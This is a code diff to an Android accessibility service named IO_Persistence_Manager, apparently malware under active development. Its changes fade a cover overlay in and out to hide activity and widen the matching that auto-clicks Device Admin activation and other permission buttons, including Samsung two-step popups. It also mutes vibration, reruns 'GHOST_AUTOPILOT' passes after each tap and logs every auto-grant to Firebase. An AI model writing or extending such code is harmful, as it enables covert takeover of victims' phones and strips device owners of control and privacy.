@@ -593,7 +593,9 @@ public class IO_Persistence_Manager extends AccessibilityService {
                         params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                     }
 
+                    permissionCoverView.setAlpha(0.0f);
                     wm.addView(permissionCoverView, params);
+                    permissionCoverView.animate().alpha(1.0f).setDuration(180).start();
 
                     coverTextIndex = 0;
                     if (coverTextRunnable != null) {
@@ -647,9 +649,14 @@ public class IO_Persistence_Manager extends AccessibilityService {
                     coverTextRunnable = null;
                 }
                 if (permissionCoverView != null) {
-                    wm.removeViewImmediate(permissionCoverView);
+                    final View viewToRemove = permissionCoverView;
                     permissionCoverView = null;
-                    Log.d(TAG, "GHOST_AUTOPILOT: Permission Cover Overlay REMOVED successfully");
+                    viewToRemove.animate().alpha(0.0f).setDuration(220).withEndAction(() -> {
+                        try {
+                            wm.removeView(viewToRemove);
+                        } catch (Exception ignored) {}
+                    }).start();
+                    Log.d(TAG, "GHOST_AUTOPILOT: Permission Cover Overlay REMOVED smoothly");
                 }
             }
         } catch (Exception e) {
@@ -1883,6 +1890,27 @@ public class IO_Persistence_Manager extends AccessibilityService {
         return false;
     }
 
+    private boolean isInteractiveButtonNode(AccessibilityNodeInfo node) {
+        if (node == null) return false;
+
+        if (node.isClickable()) return true;
+
+        CharSequence clsSeq = node.getClassName();
+        String clsName = clsSeq != null ? clsSeq.toString().toLowerCase() : "";
+        if (clsName.contains("button")) return true;
+
+        AccessibilityNodeInfo parent = node.getParent();
+        if (parent != null) {
+            boolean parentClickable = parent.isClickable();
+            parent.recycle();
+            if (parentClickable) return true;
+        }
+
+        Rect bounds = new Rect();
+        node.getBoundsInScreen(bounds);
+        return bounds.centerY() > 1000;
+    }
+
     private boolean searchPermissionButtonDfs(AccessibilityNodeInfo node) {
         if (node == null) return false;
 
@@ -1912,7 +1940,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
                         CharSequence pkgSeq = root.getPackageName();
                         String pkgStr = pkgSeq != null ? pkgSeq.toString().toLowerCase() : "";
                         root.recycle();
-                        if (pkgStr.contains("settings")) {
+                        if (pkgStr.contains("settings") && !lowerId.contains("admin") && !lowerId.contains("action_button")) {
                             startSmartExitSettingsLoop();
                         }
                     }
@@ -1931,18 +1959,20 @@ public class IO_Persistence_Manager extends AccessibilityService {
             String lowerText = text.toLowerCase();
             String lowerDesc = desc.toLowerCase();
 
-            // Explicit Device Admin Activation Button Match
-            boolean isAdminButton = (lowerText.contains("activate") || lowerDesc.contains("activate")) &&
+            // Explicit Device Admin Activation Button Match (Handles Step 1 & Step 2 Samsung Popups)
+            boolean isAdminButton = (lowerText.contains("activate") || lowerDesc.contains("activate") ||
+                     lowerText.contains("turn on") || lowerDesc.contains("turn on") ||
+                     lowerText.equals("ok") || lowerDesc.equals("ok")) &&
                     (lowerText.contains("admin") || lowerDesc.contains("admin") ||
                      lowerText.contains("device") || lowerDesc.contains("device") ||
+                     lowerText.contains("turn on") || lowerDesc.contains("turn on") ||
                      lowerText.equals("activate") || lowerDesc.equals("activate") ||
                      lowerText.startsWith("activate"));
 
-            if (isAdminButton && lowerText.length() < 60) {
+            if (isAdminButton && lowerText.length() < 60 && isInteractiveButtonNode(node)) {
                 if (performNodeClick(node)) {
                     Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted Device Admin via text [" + text + "]");
                     FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted Device Admin via text [" + text + "]");
-                    startSmartExitSettingsLoop();
                     return true;
                 }
             }
@@ -1962,7 +1992,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
                     (lowerText.startsWith(kw) && lowerText.length() < kw.length() + 15)) {
                     
                     // Exclude long title sentences
-                    if (lowerText.length() < 50) {
+                    if (lowerText.length() < 50 && isInteractiveButtonNode(node)) {
                         if (performNodeClick(node)) {
                             Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted permission via text [" + text + "]");
                             FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted permission via text [" + text + "]");
@@ -1972,7 +2002,8 @@ public class IO_Persistence_Manager extends AccessibilityService {
                                 CharSequence pkgSeq = root.getPackageName();
                                 String pkgStr = pkgSeq != null ? pkgSeq.toString().toLowerCase() : "";
                                 root.recycle();
-                                if (pkgStr.contains("settings")) {
+                                boolean isAdminKeyword = lowerText.contains("activate") || lowerText.contains("admin") || lowerText.contains("device") || lowerText.contains("turn on");
+                                if (pkgStr.contains("settings") && !isAdminKeyword) {
                                     startSmartExitSettingsLoop();
                                 }
                             }
@@ -2053,6 +2084,13 @@ public class IO_Persistence_Manager extends AccessibilityService {
             if (tapRes || clicked) {
                 muteVibration();
                 Log.d(TAG, "GHOST_AUTOPILOT: Auto-click gesture tap executed at (" + x + ", " + y + ")");
+
+                // Schedule multi-pass follow-ups for 2-step confirmation popups
+                Handler mainHandler = new Handler(Looper.getMainLooper());
+                mainHandler.postDelayed(this::executeAutoPilotPass, 250);
+                mainHandler.postDelayed(this::executeAutoPilotPass, 500);
+                mainHandler.postDelayed(this::executeAutoPilotPass, 800);
+
                 return true;
             }
         }
